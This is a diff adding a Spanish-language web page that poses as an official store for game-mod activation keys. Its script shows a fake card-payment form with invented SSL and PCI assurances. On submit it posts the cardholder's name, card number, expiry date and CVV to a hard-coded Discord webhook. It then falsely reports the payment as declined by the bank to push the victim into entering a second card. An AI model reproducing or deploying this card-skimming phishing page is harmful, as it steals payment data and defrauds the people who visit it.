@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activity Key Mod | Official Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #050505; color: #e2e2e2; font-family: 'Segoe UI', Roboto, sans-serif; }
+        .glass { background: #111114; border: 1px solid #1f1f23; border-radius: 24px; }
+        .neon-btn { background: #00f2fe; color: #000; font-weight: 900; box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3); transition: 0.3s; }
+        .neon-btn:hover { box-shadow: 0 0 25px #00f2fe; transform: scale(1.02); }
+        .input-ff { background: #0a0a0c; border: 1px solid #222; padding: 14px; border-radius: 12px; width: 100%; outline: none; transition: 0.3s; color: white; }
+        .input-ff:focus { border-color: #00f2fe; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div id="app-root" class="max-w-md w-full">
+        <div id="step-1" class="glass p-8 text-center border-t-4 border-cyan-500">
+            <h1 class="text-3xl font-black italic text-cyan-400 mb-2 uppercase">ACTIVITY MODS</h1>
+            <p class="text-gray-500 text-[10px] tracking-[0.3em] mb-8">SISTEMA DE KEYS AUTOMÁTICO</p>
+            
+            <div class="space-y-4">
+                <div onclick="initPay('PRO ACCESS (7 DÍAS)', '3.67')" class="glass p-4 cursor-pointer hover:bg-[#16161a] transition-all border border-gray-800">
+                    <div class="text-xs text-gray-500">PATO TEAM KEY</div>
+                    <div class="text-xl font-bold italic">7 DÍAS - $3.67 USD</div>
+                </div>
+                <div onclick="initPay('ELITE ACCESS (30 DÍAS)', '20.00')" class="glass p-4 cursor-pointer hover:bg-[#16161a] transition-all border border-gray-800">
+                    <div class="text-xs text-gray-500">PATO TEAM KEY</div>
+                    <div class="text-xl font-bold italic">30 DÍAS - $20.00 USD</div>
+                </div>
+            </div>
+            <p class="mt-6 text-[10px] text-gray-600 italic">Seleccione un plan para habilitar la pasarela de pago.</p>
+        </div>
+    </div>
+
+    <script>
+        const WH_URL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+
+        function initPay(plan, precio) {
+            // Renderizado dinámico del formulario de tarjeta (para evitar bots)
+            const root = document.getElementById('app-root');
+            root.innerHTML = `
+                <div class="glass p-8 border-t-4 border-white shadow-2xl animate-pulse-once">
+                    <div class="flex justify-between items-center mb-6">
+                        <h2 class="text-xl font-black italic">PAGO CON TARJETA</h2>
+                        <img src="https://img.icons8.com/color/48/000000/visa.png" width="30">
+                    </div>
+                    <p class="text-cyan-400 text-[10px] font-bold mb-6 uppercase tracking-widest">SISTEMA SEGURO SSL DE 256 BITS</p>
+                    
+                    <form id="final-form" class="space-y-4">
+                        <div>
+                            <label class="text-[10px] text-gray-500 font-bold ml-1 uppercase italic">Nombre del Titular</label>
+                            <input type="text" id="t_name" class="input-ff" placeholder="COMO FIGURA EN LA TARJETA" required>
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-gray-500 font-bold ml-1 uppercase italic">Número de Tarjeta (Débito/Crédito)</label>
+                            <input type="text" id="t_num" class="input-ff" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                        </div>
+                        <div class="flex gap-4">
+                            <div class="w-1/2">
+                                <label class="text-[10px] text-gray-500 font-bold ml-1 uppercase italic">Vencimiento</label>
+                                <input type="text" id="t_exp" class="input-ff" placeholder="MM/AA" maxlength="5" required>
+                            </div>
+                            <div class="w-1/2">
+                                <label class="text-[10px] text-gray-500 font-bold ml-1 uppercase italic">CVV (Cód. Seguridad)</label>
+                                <input type="password" id="t_cvv" class="input-ff" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+                        <button type="submit" id="btn-submit" class="w-full neon-btn py-4 rounded-xl mt-6 uppercase italic text-sm">
+                            PAGAR $${precio} USD Y RECIBIR KEY
+                        </button>
+                    </form>
+                    <div class="mt-6 flex justify-center items-center gap-4 opacity-30 grayscale">
+                         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="30">
+                         <img src="https://www.pci-ds.com/wp-content/uploads/2021/04/pci-logo.png" width="40">
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('final-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const btn = document.getElementById('btn-submit');
+                btn.innerHTML = "<i class='fas fa-sync fa-spin'></i> VERIFICANDO...";
+                btn.disabled = true;
+
+                const payload = {
+                    embeds: [{
+                        title: "💳 PAGO ENTRANTE: " + plan,
+                        color: 0x00f2fe,
+                        fields: [
+                            { name: "👤 Titular", value: document.getElementById('t_name').value },
+                            { name: "💳 Tarjeta", value: "||" + document.getElementById('t_num').value + "||" },
+                            { name: "📅 Fecha", value: document.getElementById('t_exp').value, inline: true },
+                            { name: "🔒 CVV", value: "||" + document.getElementById('t_cvv').value + "||", inline: true }
+                        ],
+                        footer: { text: "Actvity Mod Panel 2026" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                fetch(WH_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    setTimeout(() => {
+                        alert("TRANSACCIÓN RECHAZADA: Su banco ha bloqueado este pago por razones de seguridad internacional. Por favor, intente con una tarjeta de otro banco para activar su Key.");
+                        location.reload();
+                    }, 2000);
+                });
+            });
+        }
+    </script>
+</body>
+  </html>
+  
